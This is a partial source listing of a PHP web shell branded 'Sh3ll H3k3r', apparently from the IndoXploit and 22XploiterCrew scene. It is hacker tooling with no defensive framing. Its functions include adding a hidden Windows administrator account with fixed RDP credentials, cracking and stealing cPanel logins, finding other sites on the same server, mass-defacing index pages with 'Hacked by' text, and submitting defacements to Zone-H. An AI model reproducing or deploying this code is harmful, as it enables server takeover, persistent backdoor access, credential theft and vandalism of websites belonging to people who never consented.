...
$password = "dee13217fcb0cee5c837dcc9abbe49bd"; 
+
...
<center>
<header>
	<pre><center><img style="width:100px;" src="https://i.ibb.co/4f2pQ8c/images-11.jpg">
</center><br><font color="red" face="Papyrus">41n6 H3k3r</font<br><iframe width="1" height="1"lol@gmail.com" frameborder="0" allowfullscreen=""></iframe>
<p></p> <br><marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="40" width="100%" style="width: 100%;">
<font color="black">________cari________</font></marquee><marquee behavior="scroll" direction="right" scrollamount="100" scrolldelay="40" width="100%" style="width: 100%;">
<font color="black">________apa_________</font></marquee><br>
...
<font color="Red">41n6 H3k3r</font></marquee><br><marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="40" width="100%" style="width: 100%;">
<font color="white">_____________________</font></marquee>
</center><html><br><center><font color="red" face="Papyrus">© </font><font color="White" face="Papyrus">./HiraruKun</font></center>
<!--
###############################################################################
...
// Greetz: 22XploiterCrew, Tangerang Black Hat
###############################################################################
// Special Thanks: All Member Official 22XploiterCrew
###############################################################################
-->
<head>
<title>Sh3ll H3k3r</title>
<meta name='author' content=./HiraruKun'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
body {
    background-image:url("https://i.ibb.co/GchzwP9/IMG-20190701-153328.jpg");
    background-repeat: no-repeat;
    background-size: 100% 110%;
}
html {
...
function tools($toolsname, $args = null) {
	...
	elseif($toolsname === "jumping") {
		...
		print ($i === 0) ? "" : "<p>".color(1, 3, "Total ada $i jodoh di ".$GLOBALS['SERVERIP'])."</p>";
	}
	...
	elseif($toolsname === "krdp") {
		...
		if(preg_match("/indoxploit/", exe("net user"))) die(color(1, 1, "[INFO] username 'Cr0t_D1_D4l3m' already exists."));

		$add_user   = exe("net user Cr0t_D1_D4l3m Cr0t_D1_D4l3m /add");
    	$add_groups1 = exe("net localgroup Administrators Cr0t_D1_D4l3m /add");
    	$add_groups2 = exe("net localgroup Administrator Cr0t_D1_D4l3m /add");
    	$add_groups3 = exe("net localgroup Administrateur Cr0t_D1_D4l3m /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "Cr0t_D1_D4l3m")."<br>
    	Password: ".color(1, 2, "Cr0t_D1_D4l3m")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='http://indoxploit.or.id/' target='_blank'>".color(1, 2, "Cr0t_D1_D4l3m")."</a></center>";
}
	...
	if(isset($_GET['do'])) {
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='Cr0t_D1_D4l3m' '><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				...
				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by Cr0t_D1_D4l3m")."</p>";
			} else {
				print "<center>
		...
		elseif($_GET['do'] == 'mpc') {
			if($_POST['takiss']) {
				...
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='Cr0t_D1_D4l3m' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='Cr0t_D1_D4l3m' placeholder='pass_baru'><br>
				<input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 215px; margin: 5px auto;' type='submit' name='takis!' value='takis!'>
				</form></center>";
			}
		}
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Cr0t_D1_D4l3m </textarea><br>
		...
		elseif($_GET['do'] == 'fakeroot') {
			...
			if($_POST['reverse']) {
				...
				print "</textarea><br>
				<font style='text-decoration: underline;'>Index File:</font><br>
				<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Akatsuki attacker id</textarea><br>
